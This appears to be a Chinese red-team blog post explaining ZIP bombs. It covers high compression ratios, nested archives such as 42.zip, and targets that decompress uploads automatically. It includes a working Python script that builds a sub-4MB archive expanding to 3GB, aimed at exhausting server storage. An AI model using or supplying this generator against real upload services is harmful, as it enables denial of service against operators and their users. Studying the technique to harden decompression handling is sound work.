---
title: 【红队】ZIP炸弹漏洞
date: 2026-03-26
image: /images/127.webp
categories:
  - 红队
---
# 前言
压缩包炸弹（又称解压炸弹）是利用压缩算法的重复数据高效压缩特性，以极小体积在解压时产生海量数据，从而耗尽系统 CPU、内存、磁盘等资源，达成拒绝服务（DoS）或绕过安全扫描的恶意文件。以下从原理与业务场景两方面展开说明。
# 核心原理
- 超高压缩比构造：利用 DEFLATE、BZIP2 等算法对高度重复数据（如全零、相同字符）的极致压缩能力，生成 “扁平型” 炸弹。例如 1GB 全零文件可压缩至数 KB，解压时瞬间膨胀，直接填满磁盘。典型案例如 42.zip，42KB 压缩包解压后达 4.5PB，依赖多层嵌套与高压缩比结合实现。
- 递归嵌套结构：采用 “压缩包套压缩包” 的多层嵌套设计，每层包含多个同级压缩包副本，解压时触发递归膨胀。如 42.zip 为 5 层嵌套，每层 16 个副本，最终生成超百万个**
- 大文件，总容量指数级增长。
- 资源耗尽机制：解压过程中，CPU 需处理海量数据解码，内存暂存解压流，磁盘写入膨胀数据，任一环节超限即导致系统卡顿、崩溃或服务不可用。同时可瘫痪依赖解压扫描的杀毒软件，为后续恶意代码入侵创造条件。
# 业务场景
业务**自动解压**：上传后系统自动解压压缩包（如云存储的解压预览、OA 的附件解压分发、电商的商品素材解压存储）
# 利用方法
压缩包炸弹生成脚本
```python
import zipfile
import os


def create_zip_bomb(zip_filename, target_uncompressed_size_gb, chunk_size_mb=10):
    """
    创建压缩包炸弹（修复ZIP64支持，适配大文件写入）
    :param zip_filename: 输出的压缩包文件名
    :param target_uncompressed_size_gb: 解压后的目标大小（GB）
    :param chunk_size_mb: 每次写入的块大小（MB），避免内存溢出
    """
    # 单位转换：GB -> MB -> Bytes
    target_size_bytes = target_uncompressed_size_gb * 1024 * 1024 * 1024
    chunk_size_bytes = chunk_size_mb * 1024 * 1024

    # 生成全零数据块（压缩算法对重复数据压缩比极高）
    zero_chunk = b'\x00' * chunk_size_bytes

    # 关键修复：启用ZIP64扩展，支持大文件写入
    with zipfile.ZipFile(
        zip_filename,
        'w',
        compression=zipfile.ZIP_DEFLATED,
        compresslevel=9,
        allowZip64=True  # 启用ZIP64，支持大于4GB的文件（3GB也需要这个参数）
    ) as zf:
        # 向压缩包中写入一个名为large_file.bin的文件
        with zf.open('large_file.bin', 'w', force_zip64=True) as f:  # 强制使用ZIP64
            written_bytes = 0
            # 分块写入，直到达到目标大小
            while written_bytes < target_size_bytes:
                # 最后一块可能不足chunk_size，避免超出目标大小
                remaining = target_size_bytes - written_bytes
                write_chunk = zero_chunk if remaining >= chunk_size_bytes else b'\x00' * remaining
                f.write(write_chunk)
                written_bytes += len(write_chunk)
                # 打印进度（可选）
                progress = (written_bytes / target_size_bytes) * 100
                print(f"写入进度: {progress:.2f}%", end='\r')

    # 输出结果信息
    zip_size_mb = os.path.getsize(zip_filename) / (1024 * 1024)
    print(f"\n压缩包生成完成！")
    print(f"压缩包文件名: {zip_filename}")
    print(f"压缩包大小: {zip_size_mb:.2f} MB")
    print(f"解压后大小: {target_uncompressed_size_gb} GB")


if __name__ == "__main__":
    # 生成解压后3GB、压缩包小于3MB的炸弹
    create_zip_bomb("zip_bomb_3gb.zip", target_uncompressed_size_gb=3)
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260326101215.png)
可以发现压缩包大小不超过4m,而解压后却能达到3g
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20260326101229.png)
# 影响
若在上传文件时，系统后端设置了自动解压，则可耗尽服务器存储资源造成服务宕机